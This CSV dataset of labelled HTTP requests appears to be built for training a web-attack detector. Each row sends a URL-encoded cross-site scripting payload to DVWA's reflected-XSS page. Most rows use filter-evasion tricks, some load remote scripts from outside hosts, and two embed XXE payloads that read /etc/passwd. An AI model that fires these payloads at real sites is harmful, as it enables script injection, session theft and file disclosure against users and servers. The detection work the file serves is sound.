method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cisindex%2Fautofocus%2Fonfocus%3Dalert%28%29%3E&user_token=fd951026d2a87f310026abf0fb040de5,,0,0,0,1,0,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cmarquee+onScroll+marquee+onScroll%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fmarquee+onScroll%3E&user_token=244d3ab4c86e03ab236a97f98dacb74b,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=71830f81ef9687fe194abc4c9d27f958,,2,2,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+%5Cx12src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E&user_token=f724fc73135c9c232d602eda70ad22c9,,0,2,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%25253cscript%25253ealert%281%29%25253c%2Fscript%25253e&user_token=af8929d300795a7edd6719bbad3f95a3,,0,0,0,1,0,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cstyle+TYPE%3D%22text%2Fjavascript%22%3Edocument.vulnerable%3Dtrue%3B%3C%2Fstyle%3E&user_token=9023c71bed73eb1483186a2a5fc101d9,,0,2,0,0,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E&user_token=3587697b7e8b23203047a33cd3fa4a05,,0,0,0,0,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%5C%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%5C%22%3E&user_token=d17b45f60b35bbeb93a2daec89e6c937,,2,2,0,1,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5CxAFjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=6cb92a0e267fbe642638df4469a26ae0,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%5C%22%3Bdocument.vulnerable%3Dtrue%3B%3B%2F%2F&user_token=c91d4d96c45a5f46454da98945b5a782,,0,1,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxF0%5Cx90%5Cx96%5Cx9Ajavascript%3Aalert%281%29%3C%2Fscript%3E&user_token=b2e9b00a2d607155b8d6012d491a7892,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CP+STYLE%3D%22behavior%3Aurl%28%27%23default%23time2%27%29%22+end%3D%220%22+onEnd%3D%22javascript%3Aalert%281%29%22%3E&user_token=c47f7851c47f0ccdd27503b0152dc16d,,2,6,0,2,3,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Dx+ondblclick%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E&user_token=cd98d18c73e2f4ee14c8b0cc3fe72567,,0,2,0,2,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript+%2F**%2F%3E%2F**%2Falert%281%29%2F**%2F%3C%2Fscript+%2F**%2F&user_token=5aa44021716fb254a9e0a0c4cad5926b,,0,0,0,1,2,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BSCRIPT+a%3D%5C%22%26gt%3B%27%26gt%3B%5C%22+SRC%3D%5C%22http%26%2358%3B%2F%2Fha%26%2346%3Bckers%26%2346%3Borg%2Fxss%26%2346%3Bjs%5C%22%26gt%3B%26lt%3B%2FSCRIPT%26gt%3B&user_token=b1d395ed4d59f8a46e1c075f48e6034f,,1,4,0,0,2,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Eif%28%22x%5C%5CxE1%5Cx96%5Cx89%22.length%3D%3D2%29+%7B+javascript%3Aalert%281%29%3B%7D%3C%2Fscript%3E&user_token=612e6351f6227e00656c3615b2743e07,,0,2,0,2,2,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx10javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=633b2efacfae3b04134a1b39d15e9c98,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C&user_token=fa30488d9a51a34d8f92262b085d0a96,,0,0,0,0,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=52d287678b9479b3c9c09b48b1456be4,,2,4,0,1,2,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=e18c7b2980801c8f5dfd16de80fa5ccf,,0,2,0,0,2,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+SRC%3D%22+%26%2314%3B+javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&user_token=5205cb6387b047e342cb1d8d3d2ada67,,0,2,0,0,3,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&user_token=fce9a568e6bf6619cc880c5685183cc7,,0,4,0,0,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx05cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=d305ab606ca39690dd7cffbd271a7451,,0,4,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BHEAD%26gt%3B%26lt%3BMETA+HTTP-EQUIV%3D%26quot%3BCONTENT-TYPE%26quot%3B+CONTENT%3D%26quot%3Btext%2Fhtml%3B+charset%3DUTF-7%26quot%3B%26gt%3B+%26lt%3B%2FHEAD%26gt%3B%2BADw-SCRIPT%2BAD4-alert%28%26apos%3BXSS%26apos%3B%29%3B%2BADw-%2FSCRIPT%2BAD4-&user_token=0693cfec0f1518cffccce232c2fce090,,0,0,0,1,4,12,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BDIV+STYLE%3D%5C%22background-image%26%2358%3B%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028%26%2346%3B1027%5C0058%26%2346%3B1053%5C0053%5C0027%5C0029%27%5C0029%5C%22%26gt%3B&user_token=e9a519dc0598599ed47901c347aa9131,,2,2,0,0,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BIMG+SRC%3Djavascript%3Aalert%28%26%3Bquot%3BXSS%26%3Bquot%3B%29%3E%3B&user_token=b0131e675626aff094996e60f8d6c809,,0,0,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BXML+ID%3DI%26gt%3B%26lt%3BX%26gt%3B%26lt%3BC%26gt%3B%26lt%3B%21%5BCDATA%5B%26lt%3BIMG+SRC%3D%26quot%3Bjavas%5D%5D%26gt%3B%26lt%3B%21%5BCDATA%5Bcript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B%5D%5D%26gt%3B&user_token=3f9388548fda4ffbc7402043dc55c81d,,0,0,0,1,2,16,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cevent-source+src%3D%22%25%28event%29s%22+onload%3D%22javascript%3Aalert%281%29%22%3E&user_token=c037adead97730c8e8cec4068a45f80a,,0,4,0,2,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg+onUnload+svg+onUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fsvg+onUnload%3E&user_token=74043577c15d39758555dc3309d3edac,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript+x%3Ahref%3D%27https%3A%2F%2Fdl.dropbox.com%2Fu%2F13018058%2Fjs.js%27+%7BOpera%7D&user_token=d1b85b0e4fdede181fa9477e422f31f9,,2,0,0,0,2,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BBODY+onload%21%23%24%25%26%3B%28%29*%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B&user_token=e23e1c2810e9b6da984bb1387b2a1cea,,0,2,0,2,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody+onBeforeUnload+body+onBeforeUnload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fbody+onBeforeUnload%3E&user_token=5b7d6d307ef1948c2ecca590104dd35d,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cstyle%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2Fa%3E&user_token=ed2b294967d01579772ba157c5ca6820,,0,2,0,1,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+aa+aaa+aaaa+aaaaa+aaaaaa+aaaaaaa+aaaaaaaa+aaaaaaaaa+aaaaaaaaaa+href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe&user_token=1fbcf68373d692a93f7b9c05ee61ce02,,0,0,0,1,10,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E&user_token=61af67711d726018da1ce5a8cd5ca488,,0,2,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%23x03c&user_token=426ac4ed4c569f229accddd9a92bae9d,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%2Fsvg%3E%27%27%3Csvg%3E%3Cscript+%27AQuickBrownFoxJumpsOverTheLazyDog%27%3Ealert%26%23x28%3B1%26%23x29%3B+%7BOpera%7D&user_token=b63f0e9654df6a58f1374ac050181410,,4,0,0,0,2,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+SRC%3D%27vbscript%3Adocument.vulnerable%3Dtrue%3B%27%3E&user_token=ae8bdb2412247c1479cd29f2599e6d1b,,2,0,0,0,1,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx12%22javascript%3Aalert%281%29%22%3E&user_token=ef0c7ac3eb1213bbc9ff2df71f90980b,,0,2,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx20%3Djavascript%3Aalert%281%29%3E&user_token=c1bfdd0115f4b51c219876f070d3a06f,,1,1,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx02cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=c004f81898c8c6491a194469b8456d91,,0,4,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22width%3A+expression%28document.vulnerable%3Dtrue%3B%29%3B%22%3E&user_token=81cc9f6600350477688cfac12135b229,,0,2,0,1,2,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cvideo%3E%3Csource+onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E&user_token=eed39f34748331dfb58e812bba835b19,,0,2,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Dx+onloadeddata%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E&user_token=93bd78501711d52732de034ce5e21476,,0,2,0,2,2,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BXML+SRC%3D%22%3Bhttp%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22%3B+ID%3DI%3E%3B%3C%3B%2FXML%3E%3B&user_token=efb8378027b76dac03b8d1392458aa17,,0,2,0,0,2,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&user_token=9a7463268e8db16aec297c73e2728b63,,2,2,0,1,1,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSCRIPT+a%3D%22%3E%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=7b03490c15f7996a60e63fbe38929b0e,,2,4,0,0,3,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26lt%3BMETA+HTTP-EQUIV%3D%26quot%3BSet-Cookie%26quot%3B+Content%3D%26quot%3BUSERID%3D%26lt%3BSCRIPT%26gt%3Balert%28%26apos%3BXSS%26apos%3B%29%26lt%3B%2FSCRIPT%26gt%3B%26quot%3B%26gt%3B&user_token=aeaf045d91ded6467389cf07f7633129,,0,0,0,1,2,12,bad
GET,/dvwa/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF&user_token=1aa2cb9fbe7d5f437ecac57d5d71d5d1,,0,2,0,2,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22&user_token=bbaae4fb82099b321adc200eca286e39,,0,2,0,0,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Csvg%3E%3Cscript%3E%2F%2F%26NewLine%3Bconfirm%281%29%3B%3C%2Fscript+%3C%2Fsvg%3E&user_token=ac7fae702ceabfd40ee58584fb7ca1b1,,0,0,0,1,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cframeset+onFocus+frameset+onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fframeset+onFocus%3E&user_token=7bf0d3ceffe09d771c7623663ad5bae5,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=1a03665471ed993721d5fbf14802b3be,,2,4,0,1,2,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E&user_token=f8c33f66a3b287373d3c0ecb4756bcde,,0,4,0,1,3,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx0Ccript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=9ceb602df87835aa0d2c5706475461e4,,0,4,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx83javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=d9a325c9c2c047fe93e7bd089022a278,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E&user_token=f94b4afd8287c47a4c29f3791da6efb8,,2,2,0,1,1,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fdev%2Frandom%22%3E%5D%3E%3Cfoo%3E%26xee%3B%3C%2Ffoo%3E&user_token=a73c67e73d4025fc7bc58536ecaf5dd3,,0,6,0,0,9,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx00cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=3abb4283d72ce7d3f0589e15cadd5279,,0,4,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cform%3E%3Ca+href%3D%22javascript%3A%5Cu0061lert%26%23x28%3B1%26%23x29%3B%22%3EX%3C%2Fscript%3E%3Cimg%2F*%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F*%2Fonerror%3D%27eval%28src%29%27%3E&user_token=33407a3563df411f480651eafa777848,,2,4,0,1,1,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%23X003C%3B&user_token=1f7adf274c4f584872f6f6075af577e3,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%2Fsvg%3E%27%27%3Csvg%3E%3Cscript+%27AQuickBrownFoxJumpsOverTheLazyDog%27%3Ealert%26%23x28%3B1%26%23x29%3B+%7BOpera%7D&user_token=0dcd7d419ab2a2e6bfc77454cb5a5dee,,4,0,0,0,2,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cvar+onmouseover%3D%22prompt%281%29%22%3EOn+Mouse+Over%3C%2Fvar%3E&user_token=6887a0385e4c4c3541171ded62656e98,,0,2,0,1,3,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx00%22javascript%3Aalert%281%29%22%3E&user_token=206ddd84b8673ea499140752fbe21ba2,,0,2,0,1,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Adocument.vulnerable%3Dtrue%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2Fspan%3E&user_token=240ca6c476dbf60779cf02edaa680929,,0,10,2,0,6,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3BSCRIPT%2FXSS+SRC%3D%22%3Bhttp%3A%2F%2Fha.ckers.org%2Fxss.js%22%3B%3E%3B%3C%3B%2FSCRIPT%3E%3B&user_token=de960d897775e005bab321e94fa5849c,,0,2,0,0,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%26%23X3c&user_token=c630239078bf65436038306a15edbcaa,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E&user_token=4f063cb37ad129bef1ee176178aecd3f,,0,0,0,0,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%23+onerror%5Cx3D%22javascript%3Aalert%281%29%22+%3E&user_token=9d3f904d0d5d5271055e2d1eba1eef77,,0,2,0,1,3,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg%2Fsrc%3D%60%2500%60+onerror%3Dthis.onerror%3Dconfirm%281%29+&user_token=046addf02d753e636cf8426262aff694,,0,0,0,1,2,1,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%2Fstyle+%26%2332%3B%3E%3Cscript+%26%2332%3B+%3A-%28%3E%2F**%2Falert%28document.location%29%2F**%2F%3C%2Fscript+%26%2332%3B+%3A-%28&user_token=e3a1b0e8829a094c9f6b8d275b634102,,0,0,0,3,5,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xee%3B%3C%2Ffoo%3E&user_token=a237c9b85d0eebea7ef8f35ffd1d6763,,0,6,0,0,9,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx81javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=b16c1f5508b4498f5fb6b210b3944534,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+STYLE%3D%22xss%3Aexpr%2F*XSS*%2Fession%28document.vulnerable%3Dtrue%29%22%3E&user_token=f22c78b67549b0183ba5ee8366115069,,0,2,0,1,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser&user_token=85d0ea7ce56e610ddf8f14b5d46d9d6d,,0,0,0,0,3,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CsCR%3Cscript%3EiPt%3Ealert%281%29%3C%2FSCr%3C%2Fscript%3EIPt%3E&user_token=1e928fd37ebe0732ca60ae7106793515,,0,0,0,1,0,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%3F+echo%28%27%3Cscr%29%27%3B+echo%28%27ipt%3Ealert%28%5C%22XSS%5C%22%29%3C%2Fscript%3E%27%29%3B+%3F%3E&user_token=6edc597c58a9809a79f02bef6381b251,,4,2,0,3,3,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cinput+value%3D%3C%3E%3Ciframe%2Fsrc%3Djavascript%3Aconfirm%281%29&user_token=c5991b1586156379d1cf7bd56a6637b9,,0,0,0,1,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CSTYLE%3E%40import%27%25%28css%29s%27%3B%3C%2FSTYLE%3E&user_token=80f391cec7b14cac1918e5eecaaacd4b,,2,0,0,1,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%CE%93%C3%87%C3%BFXSS%CE%93%C3%87%C3%96%29%3E++++++&user_token=31103b42a688300ae9fe74768e4608d5,,0,0,0,1,7,4,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxC2%5Cx85javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=c474bf34bc06ad6107bdbef092142a6f,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3C%7E%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E&user_token=d8070c91efbe50d71102cdbb3b96ba65,,2,0,0,2,1,3,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%5Cx3c&user_token=0d91936bde9320055f3394412cc435f8,,0,0,0,0,0,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E&user_token=bb381ab237ffa1cc28b2847981905679,,0,2,0,1,1,11,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E&user_token=4cb8fb323192bd464784a0dd5fe59e17,,0,2,0,0,1,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx08javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E&user_token=e8ff65ef79a527740421370166b31d35,,0,4,0,1,2,7,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cbody+onLoad%3D%22alert%28%27XSS%27%29%3B%22&user_token=50b95b08696e9f54de5947b4219b1d55,,2,2,0,1,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+onload+iframe+onload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fiframe+onload%3E&user_token=de9da35ba7419495b5fbdfec96364a94,,0,2,0,1,4,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E&user_token=d021fbfe4198d005d63c5a8326f03021,,2,0,0,1,1,2,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22javascript%3Aalert%281%29%22%3E&user_token=eb009bb7f0e76761b9b5535f2a8fac1d,,0,2,0,1,1,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%28%60A%60%29%29%3E&user_token=41a06dc57fccc52b3d3f881545f846a0,,0,0,0,2,2,5,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3Cscript%5Cx2F%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E&user_token=e4e78034cc3daf0394a21abeeb7cf004,,0,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&user_token=efd7fff209a7634facf2ed41bbef69c8,,0,6,0,0,8,0,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx80javascript%3Aalert%281%29%3C%2Fscript%3E&user_token=46a2c1c663625721e82ec2fa3c91ddc9,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=%60%27%3E%3Cscript%3E%5CxE1%5CxA0%5Cx8Ejavascript%3Aalert%281%29%3C%2Fscript%3E&user_token=b137419784949d18a3361c88f809d26f,,1,0,0,1,0,6,bad
GET,/dvwa/vulnerabilities/xss_r/?name=alert%28String.fromCharCode%2888%2C83%2C83%29%29%3B%27%29%29%22%3E&user_token=138954b5216b0de6eb724c325b6b8770,,1,1,0,2,0,2,bad
